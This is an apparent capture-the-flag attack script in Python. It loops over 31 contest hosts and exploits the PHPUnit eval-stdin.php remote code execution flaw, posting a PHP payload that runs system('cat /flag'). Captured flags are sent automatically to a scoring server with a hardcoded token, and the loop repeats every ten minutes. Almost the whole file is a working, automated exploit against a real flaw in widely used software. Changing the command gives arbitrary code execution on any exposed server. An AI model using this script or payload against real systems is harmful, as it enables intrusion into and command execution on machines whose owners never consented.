# -*- encoding: utf-8 -*-
"""
@File    : 11.py
@Time    : 2020/12/12 9:10 上午
@Author  : 1chig0
@Software: PyCharm
@note:
"""

import requests
import time

def submit(flag):
    token = "fba23d1a70e254ee4b6e72097a5be4db"
    url = "https://172.20.1.1/Common/awd_sub_answer"
    
    try:
        data = {'answer':flag, 'token':token}
        r = requests.post(url, data=data, verify=False)
        print(r.text)
    except Exception as e:
        print(e)


def att():
    ips = ['172.20.5.1', '172.20.5.2', '172.20.5.3', '172.20.5.4', '172.20.5.5', '172.20.5.6', '172.20.5.7',
           '172.20.5.8', '172.20.5.9', '172.20.5.10', '172.20.5.11', '172.20.5.12', '172.20.5.13', '172.20.5.14',
           '172.20.5.15', '172.20.5.16', '172.20.5.17', '172.20.5.18', '172.20.5.19', '172.20.5.20', '172.20.5.21', '172.20.5.22', '172.20.5.23',  '172.20.5.24', '172.20.5.25','172.20.5.26', '172.20.5.27','172.20.5.28',
           '172.20.5.29', '172.20.5.30',"172.20.5.31"]
    i=0
    for ip in ips:
        url = "http://"+ip+":6022/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        data = "?><?php system('cat /flag');?>"
        try:
            a = requests.post(url, data=data)
            flag=a.text.replace("?>","").strip()
            if "flag" in flag:
                i = i+1
                print flag
                submit(flag)
        except:
            pass
    print i

while 1:
    att()
    print "=============="
    time.sleep(600)
    


# url = "http://"+ip+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
